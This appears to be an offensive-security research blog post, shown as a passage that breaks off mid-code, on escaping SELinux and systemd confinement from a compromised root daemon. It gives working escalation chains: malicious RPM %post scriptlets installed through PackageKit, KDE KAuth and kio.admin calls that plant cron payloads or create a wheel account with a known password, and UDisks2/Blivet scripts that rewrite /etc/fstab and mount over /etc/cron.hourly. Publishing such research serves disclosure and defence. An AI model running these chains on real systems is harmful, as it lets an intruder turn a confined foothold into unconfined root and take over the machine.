---
title: "Confined Root Is Still Root"
# subtitle: "How an SELinux + systemd confined root daemon reaches unconfined root"
subtitle: "Borrowing authority to escape SELinux and systemd service confinement"
date: '2026-08-12T00:00:00Z'
summary: "A compromised root daemon can't change its own SELinux domain. It doesn't need to - it recruits something already unconfined."
# summary: "A confined root daemon can't promote itself, but it can recruit an unconfined one."
tags: ["security", "offensive-security", "selinux", "systemd", "polkit", "dbus", "varlink", "packagekit", "kauth", "udisks2", "kde", "privilege-escalation", "linux", "sandbox"]
channels: ["vuln-research"]
---

This is part 2 of a series on SELinux and systemd confinement. Post 1 left bluetooth_t as a genuinely tight box - sealed for its own threads. Sealed for its own threads is not the same as sealed.

| Article | Contents |
|---|---|
| [Measuring the Blast Radius of a Root Daemon](/posts/measuring-selinux-systemd-confinement/) | Measure the real constraints when getting confined root exec |
| [Confined Root Is Still Root](/posts/confined-root-is-still-root/) | Escaping SELinux and systemd confinement by borrowing authority from brokers and deputies |
| Hardening and Detection (coming soon) | Closing the lanes, and catching what's left |

Over the past several months I've found and reported a string of root-daemon vulnerabilities both remote and local and written working exploits for each. Every time, the exploit landed and SELinux was already there. Code execution as root, confined to a domain that could do almost nothing, exactly as intended. So while those bugs sit under embargo, I went after the next question: how contained is a compromised root daemon?

What started as that question turned into several months of testing: mapping the reachable graph of gadgets across six stock installations, reproducing each chain end to end, building standalone PoCs for the techniques, and documenting a lot of it here.

The answer: not very contained. Across six stock Fedora, RHEL, openSUSE, and SLES installs, SELinux confined every UID-0 daemon I compromised - and stopped none of them from recruiting a more privileged part of the system to act on its behalf. Every UID-0 service domain for a daemon I wrote exploits for had at least one working route to unconfined, and these paths appear to extend to most UID-0 daemons.

A confined process cannot assign itself a better SELinux domain. It does not need to. It can ask a package manager to run a scriptlet, ask a storage service to replace another process's view of the filesystem, rewrite PID 1's unit-file state, poison the service environment, or recruit a launcher that performs a favorable type transition.

## Results at a Glance

| Class               | Technique                            | Result                                             | Availability                 |
| ------------------- | ------------------------------------ | -------------------------------------------------- | ---------------------------- |
| Execution deputy    | PackageKit `%post`                   | `rpm_script_t`, full-cap root                      | Fedora/RHEL/openSUSE         |
| Execution deputy    | KDE KAuth helpers                    | arbitrary write/account creation/unconfined exec   | Plasma systems               |
| Storage deputy      | Blivet                               | arbitrary mount options and destination            | Fedora with Blivet           |
| Storage deputy      | UDisks fstab overlay                 | typed mount -> consumer execution                  | Fedora/RHEL/openSUSE         |
| PID 1 control plane | Unit-file mutation + cold activation | `unconfined_service_t`, full caps                  | all tested systems           |
| PID 1 control plane | `SetEnvironment`                     | poisoned future service execution                  | all tested systems           |
| Filesystem view     | sysext `/usr` overlay                | replace executable -> chosen transition            | systemd ≥255 where reachable |
| Direct transition   | `startx`/`initrc_exec_t`             | `initrc_t` execution                               | systems with xinit           |
| Boundary bypass     | UserDatabase                         | password hashes despite `shadow_t` denial          | Fedora+RHEL10                |
| Boundary bypass     | Repart `CopyFiles`                   | arbitrary privileged file read                     | systemd 259 (Fedora)         |

See [Tested Versions](#tested-versions) for exact package and policy versions. [Proofs of concept](#proofs-of-concept) are provided with working examples for every technique.

## The Concept

A confined process that can't change its own domain has to get something else to act for it. Something on the box holds a label, a capability, or a view of the filesystem that you don't. Five ways I have found to borrow it:

- **Send a message** to a service that does the work for you. D-Bus, varlink, any socket it listens on. Either the service was never confined, or it is confined and the specific operation carries no check.
- **Plant a file** a differently-labeled consumer reads or executes - cron, a drop-in config, a gallery a daemon parses, a setuid binary a user runs. If the type gate stops the read, relabel the file rather than move it.
- **Change what a consumer sees** at a path without writing to that path at all. Mount over the directory it re-reads.
- **Get a launcher to exec** your code so a `type_transition` puts it in a better domain. The only one that directly changes domain.
- **Poison the environment** so that an unconfined process runs with your chosen environment variables.

Real escapes chain several of them. Ask a helper for an arbitrary root write, then plant a file in `/etc/cron.d/` for crond to execute. `system_cronjob_t` is effectively unconfined so job done. Except `/etc/cron.d/` requires an SELinux grant to write to `system_cron_spool_t` which is highly restricted, which limits the arbitrary root-writes that can actually be turned into code execution.

This work will feel familiar to anyone that has done ROP/JOP work hunting gadgets when writing exploits. A domain, helper, file type, launcher, mount view, and consumer are effectively gadgets. Mapping them out and understanding the valuable chains to compose and various entry-points to those chains is most of the game.

An example: what if you have `etc_t` write? `/etc/logrotate.d/` is a write -> exec path for that permission, this time dropping you into `logrotate_t` - a heavily confined SELinux and systemd sandbox. You will need another chain to escape to unconfined. Luckily, I have documented several of them later.

I am documenting many escape routes here, but there are many more. I am sticking to the most portable approaches here. They get relatively bespoke beyond this and this post is already long, so it's worth understanding the techniques and confinement so you can enumerate your own as-needed. Many of these methods are compatible with environments that might seem walled off at first and just need a minor change - a different writable directory or label for a different service than I used in my tests. Understand what the hurdles are and how these confinements work and see if you can find a path out.

### End-to-end Example

Here is one path, end to end, on a stock Fedora 44 box in Enforcing mode.

Starting with a shell as a compromised `bluetoothd` daemon, root but heavily restricted by both the SELinux domain and systemd restrictions:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:bluetooth_t:s0

$ id -Z
context=system_u:system_r:bluetooth_t:s0

$ grep -E "^Cap(Eff|Bnd)" /proc/self/status
CapEff: 0000000000003400
CapBnd: 0000000000003400

$ ls -al /etc/cron.d
ls: cannot access '/etc/cron.d': Permission denied

$ touch /etc/testfile
touch: cannot touch '/etc/testfile': Read-only file system
```

Create a .rpm package with our desired code in a `%post` scriptlet and call `pkcon` (`bin_t` type) to install it:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ pkcon install-local --allow-untrusted -y /run/ll-poc.rpm
```

`pkcon` is just a PackageKit helper doing two D-Bus calls we can also do directly. This runs our `%post` scriptlet in the main init namespace as `system_u:system_r:rpm_script_t:s0` which is `unconfined_domain_type`.

Check our output files for proof:

```bash
$ ls -Z /etc/cron.d/rpm.testfile 
system_u:object_r:system_cron_spool_t:s0 /etc/cron.d/rpm.testfile

$ cat /tmp/rpm.id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:rpm_script_t:s0

$ cat /tmp/rpm.status | grep -E "^Cap(Eff|Bnd)"
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
```

Unconfined with full caps. This turns out to be a surprisingly portable escape. The rest of this post is covering why this works and the other escape paths I found.

## Three Gates To Escape

When a confined daemon asks another daemon to do something privileged over D-Bus, three things stand in the way:

1. **SELinux - the type gate.** May domain *A* send a message to domain *B*? That is `allow A B:dbus send_msg`. Per-destination-*domain*, type-level.
2. **The D-Bus broker policy - the name gate.** Does the destination's XML policy permit the send? Keyed on the caller's **uid** and the destination *name/interface*.
3. **polkit - the action gate.** Is the caller authorized for this *specific* privileged action? Keyed on the caller's **uid** and session.

Three gates, and for a caller that is **uid 0**, they are frequently open:

- **Gate 1 is open by attribute.** `allow nsswitch_domain dbusd_unconfined:dbus send_msg` - one rule hands every NSS-using domain (297 confined domains, nearly every daemon on the box) `send_msg` to the entire fleet of unconfined services. `bluetooth_t` inherits it for the unrelated reason that it does name lookups. This is the attribute trap from Post 1: the reach lives on an attribute, not on `bluetooth_t`.
- **Gate 2 is open.** The fleet ships `<policy context="default"><allow send_destination=...>` in their own `.conf`, with a comment: "Allow anyone to call into the service - we'll reject callers using PolicyKit." The handful that restrict to `user="root"`, a uid-0 caller clears anyway.
- **Gate 3 is self-passed.** polkit authorizes a uid-0 subject regardless of any rule, and for systemd's own services it is skipped entirely.

So the only two things that actually discriminate are *does the domain reach the fleet* (nearly universal, by attribute) and *is it uid 0* (nearly every system daemon). None of the profiles tested here excluded `AF_UNIX` sockets or the `socket()` syscalls required for D-Bus. Settings such as `ProtectSystem=`, `PrivateTmp=`, `NoNewPrivileges=`, `CapabilityBoundingSet=` did not constrain these escapes. `RestrictAddressFamilies=AF_INET` can block the path, but this would deny all socket-based IPC. Denying socket() creation would also prevent this, but seems unlikely to be practical on a daemon.

SELinux D-Bus mediation is per-destination `send_msg` only. Once a message lands in an unconfined helper or the operation carries no type-enforcement check there is no backstop, and polkit, the boundary everyone assumes is doing the work, is inert against a caller who is already uid 0.

### Root self-passes Polkit

This is a gate you will hit constantly. Many privileged helpers a confined daemon can reach are behind polkit `auth_admin` meaning "an administrator must authenticate". root is an admin, and that's the end of it. The policy can have `allow_inactive=no` `allow_any=no` and `allow_active=no` and your call from euid 0 still passes with no auth check.

It is more interesting than that though. Monitor `CheckAuthorization` on `org.freedesktop.PolicyKit1` while the calls fire and it splits into two distinct mechanisms:

- **systemd services skip polkit entirely for uid 0.** `hostnamed`, `logind`, `timedated`, `systemd1`, `resolved`, `homed`, `portabled` route checks through `bus_verify_polkit_async -> sd_bus_query_sender_privilege`, which returns "allowed" immediately if the caller's `euid == 0` (or its uid matches the daemon's, or it holds the checked capability). polkit is never consulted - a uid-0 call produces zero `CheckAuthorization` messages.

- **polkit itself authorizes a uid-0 subject.** KDE's KAuth helpers, PackageKit, and anything using libpolkit directly do consult polkitd - which allows uid 0 before it evaluates anything. The function `check_authorization_sync()` has a comment ["special case: uid 0, root, is always authorized for anything"](https://github.com/polkit-org/polkit/blob/b3492d5ea73e030dedf53a08091d54c0ccb08acc/src/polkitbackend/polkitbackendinteractiveauthority.c#L1297): it returns an authorized response, not a challenge, and skips past the session lookup, the implicit-authorization (auth_admin) decision, and the rules engine. The action's auth_admin setting is never hit, which is how a session-less daemon with no authentication agent passes.

Two code paths, same destination, and neither is closable in polkit configuration.

When code-exec drops you somewhere and a privileged method is `auth_admin`-gated, you automatically pass if you are uid 0. Separately, you will pass if your uid equals the target daemon's uid (systemd same-uid trust). Even if you have dropped all capabilities and are in a heavily confined SELinux domain.

On the hardening side, `auth_admin` is worthless against a compromised root service. The fix isn't in polkit - it's stop running daemons as root. The calling service can opt-out of the self-pass with a `POLKIT_CHECK_AUTHORIZATION_FLAGS_ALWAYS_CHECK` flag but no Polkit services I examined use it, and none of the other helpers used here do either. That flag would break any legitimate session-less root callers though also.

### SELinux (un)confined

When looking for useful helpers, there are two patterns I look for:

- **The unconfined helper.** The target runs in an `unconfined_domain_type` (`rpm_t`, `unconfined_service_t`, `devicekit_disk_t`, `lvm_t`, ...). SELinux imposes no limit on what it does, and it does it on your behalf. The package manager, the KAuth helpers, the storage engines.
- **The confined deputy with no TypeEnforcement check.** The target is itself confined, but the specific operation carries no handler-side SELinux check: systemd's unit-file methods, the varlink transport. 

### bin_t -> unconfined

The targeted SELinux policy has a rule `type_transition init_t bin_t:process unconfined_service_t` that runs any generic `bin_t` binary PID 1 execs as uncontained root rather than failing. Privileged D-Bus-activated helpers that ship with plain bin_t executables and no dedicated domain come up unconfined_service_t on activation. There is a large difference in how many of those helpers each distro has installed: Fedora (especially KDE) ships the most while lean servers like SLES and RHEL-server ship the fewest.

D-Bus broker delegates all activations to systemd `SystemdService=` directly and for interfaces with only `Exec` dbus-broker creates a transient dbus-&lt;name&gt;@.service unit with `ExecStart=` copied from `Exec=`. In both cases systemd (`init_t`) is the executor for the entire fleet. The transition that actually fires is `init_t bin_t:process unconfined_service_t`.

That fall-through is deliberate: it exists so unpackaged and admin binaries run unconfined rather than fail to run. It's also a path to escaping confinement if you can reach one of them.

`bluetooth_t` (and 296 more confined daemons on my Fedora44 system) reaches the whole fleet via `nsswitch_domain -> dbusd_unconfined:dbus send_msg`, and the only remaining gate is the polkit `auth_admin` that uid 0 self-passes.

So: what's in the fleet, and what does each one buy.

## PackageKit

PackageKit is on all of my tested systems in the RedHat/Fedora family and openSUSE, the one exception is SUSE SLES. It is even on a minimal RHEL server install if you install the "Standard" group. PackageKit is one of the more portable escapes. `rpm` runs arbitrary shell out of package `%pre`/`%post` scriptlets.

The nature of a package manager historically is to have wide reach to install files and binaries and configure cron jobs and systemd units, etc. You cannot meaningfully confine that without re-thinking the way packages are handled entirely (snaps, containers, bespoke approaches installing to restricted paths, etc), so the targeted policy doesn't try: `packagekitd` transitions under `init_t` to `rpm_t`, which carries the full unconfined marker set:

```bash
$ seinfo -t rpm_t -x | grep -oE 'unconfined_domain_type|files_unconfined_type|kern_unconfined|selinux_unconfined_type'
unconfined_domain_type
files_unconfined_type
kern_unconfined
selinux_unconfined_type
```

Scriptlets run in `rpm_script_t` via `type_transition rpm_t shell_exec_t:process rpm_script_t`. The reachable method is `InstallFiles`, and it lives on a transaction object, not the manager - a good reminder to introspect the whole tree.

This is the example in the intro that used `pkcon`. What that is actually doing is two D-Bus calls. First:

```
org.freedesktop.PackageKit /org/freedesktop/PackageKit \
    org.freedesktop.PackageKit CreateTransaction
```

PackageKit creates a transaction and hands an ID back to us: `"/org/freedesktop/PackageKit/Transaction/247_deadbeef"`. We then call `InstallFiles` on that transaction and hand it a crafted rpm:

```
org.freedesktop.PackageKit /247_deadbeef \
    org.freedesktop.PackageKit.Transaction \
    InstallFiles tas 0 1 /dev/shm/linnemanlabs-poc.rpm
```

The privileged action for an unsigned attacker .rpm - `org.freedesktop.packagekit.package-install-untrusted` is `auth_admin`, self-passed by uid 0.

## 19 KDE entry points

KDE ships a small army of privileged helpers through KAuth. A Plasma workstation has ~19, and from a confinement-escape standpoint many are very useful. Things to note:

- Each is a `User=root` D-Bus system service on a plain `bin_t` binary (so: `unconfined_service_t` on activation)
- Each exposes the same `org.kde.kf6auth.performAction` interface accepting an action-string argument
- Each `.conf` carries the same "we'll reject callers using Polkit" comment

Pick an action string, call `performAction`, and an unconfined root helper does the work with polkit as the only gate, which we self-pass as uid0. The action strings are self-documenting - they're the `<action id>` entries under `/usr/share/polkit-1/actions/`, so enumerating the surface is one grep.

Since the writing domain is unconfined the target type is auto-applied. These all execute unconfined. Of the nineteen on my Fedora system, the most interesting are the handful that create accounts, write files, or run commands.

| helper (action) | method | what you get |
|---|---|---|
| `plasmasetup.createuser`               | `useradd`+`usermod`+`chpasswd`, no group denylist            | wheel account + password -> sudo root and/or ssh |
| `fontinst.install`                     | unsanitized copy, arbitrary dest                             | root write -> `/etc/cron.d` -> unconfined exec |
| `ktexteditor6.katetextbuffer.savefile` | arbitrary write to caller path                               | root write -> `/etc/cron.d` -> unconfined exec |
| `kio.admin` (`put`/`chmod`/`chown`/`del`/`copy`) | the entire KIO command set as root                 | full arbitrary-root-filesystem API, incl. setuid |
| `kpmcore ... CopyFileData`             | missing the `/dev`/`is_block_file` guard its siblings carry  | arbitrary root read + overwrite at controlled offset |

One interesting note: `kio.admin` returns "Access denied" to `busctl introspect` because its `.conf` comments out `Introspectable` while still allowing the command interfaces to any sender. An introspection-based reachability scan misses it which is what happened to me at first.

The [kauthclient code and full PoCs](#proofs-of-concept) for each of these helpers are in the table at the end.

### fontinst

I will link PoC's at the end of this post, but here is one example end-to-end using `org.kde.fontinst`'s `install` action which directly copies our bytes to the path we request. `destFolder + name` is entirely caller-controlled, no basename, no prefix check, no traversal filter. Aim it at `/etc/cron.d/` and the writing domain is `unconfined_service_t` (`files_unconfined_type`), and a file created in `/etc/cron.d/` auto-labels `system_cron_spool_t` that `crond` reads.

```bash
$ printf '* * * * * root id > /tmp/proof 2>&1\n' > /dev/shm/payload

$ ./kauthclient org.kde.fontinst.manage org.kde.fontinst \
      method=install file=/dev/shm/payload destFolder=/etc/cron.d/ name=linnemanlabs_poc bool:createAfm=false int:type=0

$ ls -Z /etc/cron.d/linnemanlabs_poc
system_u:object_r:system_cron_spool_t:s0 /etc/cron.d/linnemanlabs_poc

$ sleep 60
$ cat /tmp/proof
uid=0(root) ... context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
```

`system_cronjob_t` is effectively unconfined - job done.

### createuser

On a KDE system `org.kde.plasmasetup` is the Plasma first-run helper. Its `createuser` action does exactly what it says. The helper runs three commands:

```
createuser:            useradd -m -U [-c fullName] <username>      # default shell /bin/bash
addUserToExtraGroups:  usermod -a -G <extraGroups> <username>      # called unconditionally
chpasswd:              <username>:<password>                       # from the caller
```

The new account maps to `unconfined_u` (the `__default__` seuser), and `wheel` for sudo access.

End to end, live on Fedora 44 Enforcing:

```bash
$ ./kauthclient org.kde.plasmasetup.createuser org.kde.plasmasetup \
      username=svc fullName=svc extraGroups=wheel password=whatever

$ ssh svc@localhost
svc@localhost's password: 

$ id
uid=1006(svc) gid=1006(svc) groups=1006(svc),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

$ echo "whatever" | sudo -nS id 2>/dev/null
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

A confined `bluetooth_t` daemon that cant read /etc/shadow can create an admin account.

### ktexteditor6

org.kde.ktexteditor6.katetextbuffer is Kate's "Save as root" helper. It has an action called `savefile`. It copies a sourceFile -> targetFile + chown to ownerId/groupId. Pointing targetFile at /etc/cron.d/ is an arbitrary root write, auto-labeled by the target dir, in this case system_cron_spool_t.

Same as fontinst, quick example stages a cron file at `/dev/shm/payload` and gets it installed to `/etc/cron.d/linnemanlabs_poc`:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ printf '* * * * * root id > /tmp/kate.id\n' > /var/lib/bluetooth/kate_src

$ ./kauthclient org.kde.ktexteditor6.katetextbuffer.savefile org.kde.ktexteditor6.katetextbuffer \
    sourceFile=/var/lib/bluetooth/kate_src targetFile=/etc/cron.d/linnemanlabs_poc \
    hex:checksum=$( sha512sum /var/lib/bluetooth/kate_src | cut -d ' ' -f 1 ) \
    int:ownerId=0 int:groupId=0

$ ls -Z /etc/cron.d/linnemanlabs_poc
system_u:object_r:system_cron_spool_t:s0 /etc/cron.d/linnemanlabs_poc

$ sleep 60
$ cat /tmp/kate.id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
```

### kio.admin

kio.admin (`org.kde.kio.admin`) is not a KAuth helper. It's a raw D-Bus service exposing the entire KIO filesystem API as root: `put`/`copy`/`get`/`del`/`chmod`/`chown`/`mkdir`/`rename` plus a File object (`read`/`write`/`truncate`). Auth is polkit org.kde.kio.admin.commands (auth_admin_keep, uid-0 self-passes). Introspection is bus-policy-denied but the calls work. Each verb returns a job object you .start().

kio.admin `copy` preserves the source's SELinux label onto the destination. For a label-sensitive target like cron use `put` (creates fresh -> system_cron_spool_t), or `copy` a file with a desired label like `/etc/cron.d/0hourly` to inherit its system_cron_spool_t, then `file()`-rewrite in place.

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ python3 /var/lib/bluetooth/kioadmin.py
caller-domain: system_u:system_r:bluetooth_t:s0
kio.admin put()   : job=/org/kde/kio/admin/put/9
                  : dataRequest -> send payload
                  : result err=0

$ ls -Z /etc/cron.d/kio_poc
system_u:object_r:system_cron_spool_t:s0 /etc/cron.d/kio_poc

$ sleep 60
$ cat /tmp/kio.out
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

### kpmcore

kpmcore's ExternalCommandHelper (`org.kde.kpmcore.helperinterface`) exposes interface `org.kde.kpmcore.externalcommand` at /Helper with `RunCommand`/`CopyFileData`/`WriteFstab`. Can be driven by raw busctl (no KAuth blob), gated only by polkit `org.kde.kpmcore.externalcommand.init` (auth_admin_keep) - uid-0 passes.

- `RunCommand` - executes any of [~120 whitelisted storage tools](https://github.com/KDE/kpmcore/blob/master/src/util/externalcommand_whitelist.h) (chmod, mount, dmsetup, lvm, cryptsetup, ...) as unconfined root with attacker argv/stdin and hands the output back. Not direct exec but easy to chain.
- `CopyFileData` - copies bytes from sourceFile -> targetFile at a desired offset. Target must exist, target labels and attributes are preserved. Great for cron, shadow, etc.
- `WriteFstab` - write our desired bytes exactly into /etc/fstab which is significant and can be used many ways. Call a mount helper like UDisks2 and overlay any content on disk with your own with any SELinux labels and mount options you want like leaving off nosuid.

[kpmcore PoC](#proofs-of-concept) available at end of post writes an entry to /etc/fstab, adds a cron job and runs one of the whitelisted commands as unconfined root.

## The Storage Door

Altering the underlying storage provides several escape routes. Two patterns:

1. Change what a consumer sees by mounting a path on top of an existing one. Gain execution in the consumers domain by mounting over its binary. Overwrite a configuration file to influence what a consumer in a more privileged domain does. Overlay a systemd directory and drop a unit file. Easy example: mount `/etc/cron.hourly/` over the existing, wait for the next :00 hour mark -> your code runs as `system_cronjob_t` which is effectively unconfined root. `/etc/cron.d/` sounds like the natural choice, but it tracks the underlying `/etc/cron.d/` inode with `inotify` and it will not see your overlay unless restarted. `/etc/cron.hourly` is checked on exec by run-parts, which means our overlay does get used.

When able to pass in `context=` to the mount we also bypass SELinux typing issues. We may lack permissions to write `system_cron_spool_t` but by mounting over it with `context=system_cron_spool_t` we get a correctly typed file.

2. Mount a path without `nosuid` and leave an SUID binary for an unprivileged user to execute. `context=` is beneficial here given that a daemon frequently can't write to types that a confined user can execute.

### Blivet

Blivet is a python storage management library used by Fedora's Anaconda installer. Blivet provides a D-Bus interface on the system bus at `com.redhat.Blivet0`. The package is pulled in by `anaconda-core` and remains on the system.

`blivetd` runs `User=root`, its binary is plain `bin_t -> unconfined_service_t` which carries `storage_unconfined_type` and `files_unconfined_type`. It checks polkit nowhere - the only gate is the default D-Bus policy, which a uid-0 caller clears:

```console
$ busctl call com.redhat.Blivet0 /com/redhat/Blivet0/Blivet com.redhat.Blivet0.Blivet ListDevices
ao 11 "/com/redhat/Blivet0/Devices/3" "/com/redhat/Blivet0/Devices/12" ...
```

That returns a list of `device objects`. Few things to understand:

- Blivet treats a loop device as a `device object`
- Each `device object` exposes a `Format property` and separate `Format object`.
- `Format object`s have a `Setup` method.

You have complete control over the mount point and options, no `MS_NOSUID`, no allow-list, no empty-target check, no polkit, etc.

#### End-to-End

Most domains that can drive Blivet can also drive UDisks2. Which means we can create our img, mount it with a SELinux context we can write to, stage our desired files, and remount it over the desired path with a new label, all from D-Bus.

First, to show we cant write to /etc/cron.hourly/ from our confined domain:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ touch /etc/cron.hourly/test
touch: cannot touch '/etc/cron.hourly/test': Read-only file system
```

Blocked by ProtectSystem, but we lack SELinux grants even if we got past that hurdle. Stage our blivet-mount.py PoC and run it:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ python3 /var/lib/bluetooth/blivet-mount.py
[+] staged /dev/loop0 (ext4) via UDisks
[*] blivet Reset (activates daemon+scans - occasionally slow ~10s) ...
[+] wrote run-parts payload onto the image
[+] blivet overlaid /etc/cron.hourly (context=system_u:object_r:bin_t:s0)
-rwxr-xr-x root root system_u:object_r:bin_t:s0 /etc/cron.hourly/0blivet_poc
[*] run-parts /etc/cron.hourly runs 0blivet_poc hourly. check /tmp/blivet.out at the next hour :01
[*] cleanup (root): umount /etc/cron.hourly ; losetup -d /dev/loop0 ; rm /var/lib/bluetooth/blivet_poc.img
```

The mount options applied to our new mount:

```bash
$ findmnt -no OPTIONS /etc/cron.hourly
rw,relatime,seclabel
```

`seclabel` is applied so our labels are preserved, and without `nosuid` we can drop suid binaries, etc.

This has the least reach of all the findings as it is Fedora-only, `blivet-data` isn't on the RHEL or SUSE boxes.

### UDisks2

UDisks2 offers a system D-Bus service at `org.freedesktop.UDisks2`. Measure its `devicekit_disk_t` domain as described in our first post and you will see it carries the `dbusd_unconfined` attribute giving us wide reach into it.

It has several safe methods like `Filesystem.Mount` that hard-adds `nosuid,nodev` and validates requested mount options and only allows whitelisted fstypes. These can be useful at times when you need to stage content at a location another process can read but are dealing with heavy filesystem constraints.

The first interesting method it provides is `LoopSetup`. This allows us to create a loop device from a pre-built filesystem image. First, you need to create the filesystem. Most confined daemons lack the permissions to exec binaries like `mkfs.ext4` that require the filesystem-admin entrypoint `fsadm_exec_t`. UDisks2 provides this for us also. 

This is all dependent on what you want in your mounted filesystem in the end. If you need to pre-stage SUID binaries, favorable SELinux labels, etc you should create that .img off-site on a machine you have unconfined access to and transfer it in. However, I will also show the simple path to creating it all locally which works for several escape routes and shows the instructions you will need either way.


Create an empty .img file. dd is `bin_t`:

```bash
$ dd if=/dev/zero of=/var/lib/bluetooth/test.img bs=1000 count=10000
```

Create a loop device backed by that file. python3 is `bin_t`:

```python
#!/usr/bin/env python3
import os, dbus
UD = 'org.freedesktop.UDisks2'
fd  = os.open('/var/lib/bluetooth/test.img', os.O_RDWR)
bus = dbus.SystemBus()
mgr = dbus.Interface(bus.get_object('org.freedesktop.UDisks2', '/org/freedesktop/UDisks2/Manager'), 'org.freedesktop.UDisks2.Manager')
loop = mgr.LoopSetup(dbus.types.UnixFd(fd), {'read-only': False})
os.close(fd)
print(loop)
```

Create a filesystem on that loop device:

```bash
$ busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/loop0 \
      org.freedesktop.UDisks2.Block Format 'sa{sv}' ext4 0
```

Now we have a valid filesystem on a block device.

```bash
$ ls -al /dev/loop0
brw-rw----. 1 root disk 7, 0 Jul 29 23:17 /dev/loop0

$ lsblk /dev/loop0
NAME  MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
loop0   7:0    0  9.5M  0 loop 

$ blkid /dev/loop0
/dev/loop0: UUID="e1f5dc66-88ba-4b1b-861c-74cefd908844" BLOCK_SIZE="1024" TYPE="ext4"
```

Now we have our block device with a filesystem, the important part is how do we mount it, and can we choose the destination and mount options?

UDisks2 provides a useful method `Block.AddConfigurationItem` which writes to `/etc/fstab` on our behalf. Add the loop device you created with LoopSetup. I took a multi-step approach here. First, I add an entry to mount the loop device to `/var/lib/bluetooth/mnt` and pass the mount option `context=system_u:object_r:bluetooth_var_lib_t:s0` to force the SELinux context to a type we are able to write to from the `bluetooth_t` domain - we replace that type later.

```bash
$ mkdir -p /var/lib/bluetooth/mnt
```

```python
#!/usr/bin/env python3
import dbus
UD='org.freedesktop.UDisks2'
OBJ='/org/freedesktop/UDisks2/block_devices/loop0'
blk=dbus.Interface(dbus.SystemBus().get_object(UD,OBJ), UD+'.Block')
item=('fstab', {
  'fsname': dbus.ByteArray(b'/dev/loop0\0'),
  'dir':    dbus.ByteArray(b'/var/lib/bluetooth/mnt\0'),
  'type':   dbus.ByteArray(b'ext4\0'),
  'opts':   dbus.ByteArray(b'context=system_u:object_r:bluetooth_var_lib_t:s0\0'),
  'freq':   dbus.Int32(0), 'passno': dbus.Int32(0)})
blk.AddConfigurationItem(item, {}, signature='(sa{sv})a{sv}')
```

Now our entry is in `/etc/fstab`:

```bash
$ grep bluetooth/mnt /etc/fstab
/dev/loop0 /var/lib/bluetooth/mnt ext4 context=system_u:object_r:bluetooth_var_lib_t:s0 0 0
```

Now the last step, again through UDisks2 we call `Filesystem.Mount` to mount the directory. Normally this enforces several things:
- requires the fstype to pass is_allowed_filesystem (whitelist),
- forces the mountpoint to `/run/media/$USER/$LABEL`
- builds the option string hardcoding "uhelper=udisks2,nodev,nosuid" + a small allow-list.

However, if there is a `/etc/fstab` entry it treats it as admin-configured and applies the options and mount path exactly as they exist.

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/loop0 \
      org.freedesktop.UDisks2.Filesystem Mount 'a{sv}' 0
s "/var/lib/bluetooth/mnt"
```

```bash
$ findmnt /var/lib/bluetooth/mnt
TARGET                 SOURCE     FSTYPE OPTIONS
/var/lib/bluetooth/mnt /dev/loop0 ext4   rw,relatime,context=system_u:object_r:bluetooth_var_lib_t:s0
```

Write a cron entry to `/var/lib/bluetooth/mnt/hourlyscript`:

```bash
$ cat > /var/lib/bluetooth/mnt/hourlyscript <<'EOF'
#!/bin/bash
{
    id
    grep -E '^Cap(Eff|Bnd)' /proc/self/status
} > /tmp/mount.cron.id 2>&1
EOF

$ chmod 755 /var/lib/bluetooth/mnt/hourlyscript
```

Now we have a valid block device, filesystem, and a file with a valid cron entry. The last step is to mount this over the top of `cron` and execute our code. We use `/etc/cron.hourly` so cron sees it for reasons explained earlier.

Unmount the device:

```bash
$ busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/loop0 \
      org.freedesktop.UDisks2.Filesystem Unmount 'a{sv}' 0
```

Remove the /etc/fstab entry:

```python
#!/usr/bin/env python3
import dbus
UD='org.freedesktop.UDisks2'
OBJ='/org/freedesktop/UDisks2/block_devices/loop0'
blk=dbus.Interface(dbus.SystemBus().get_object(UD,OBJ), UD+'.Block')
item=('fstab', {
  'fsname': dbus.ByteArray(b'/dev/loop0\0'),
  'dir':    dbus.ByteArray(b'/var/lib/bluetooth/mnt\0'),
  'type':   dbus.ByteArray(b'ext4\0'),
  'opts':   dbus.ByteArray(b'context=system_u:object_r:bluetooth_var_lib_t:s0\0'),
  'freq':   dbus.Int32(0), 'passno': dbus.Int32(0)})
blk.RemoveConfigurationItem(item, {}, signature='(sa{sv})a{sv}')
```

```bash
$ grep bluetooth/mnt /etc/fstab
$
```

This time I mount it over the top of `/etc/cron.hourly` with `context=system_u:object_r:bin_t:s0` (cron.hourly is bin_t). Not strictly necessary as `system_cronjob_t` is unconfined but worth learning since you will need correct typing for many other paths like logrotate.d etc. Add the new `/etc/fstab` entry:

```python
#!/usr/bin/env python3
import dbus
UD='org.freedesktop.UDisks2'
OBJ='/org/freedesktop/UDisks2/block_devices/loop0'
blk=dbus.Interface(dbus.SystemBus().get_object(UD,OBJ), UD+'.Block')
item=('fstab', {
  'fsname': dbus.ByteArray(b'/dev/loop0\0'),
  'dir':    dbus.ByteArray(b'/etc/cron.hourly\0'),  # your target mountpoint
  'type':   dbus.ByteArray(b'ext4\0'),
  'opts':   dbus.ByteArray(b'context=system_u:object_r:bin_t:s0\0'),
  'freq':   dbus.Int32(0), 'passno': dbus.Int32(0)})
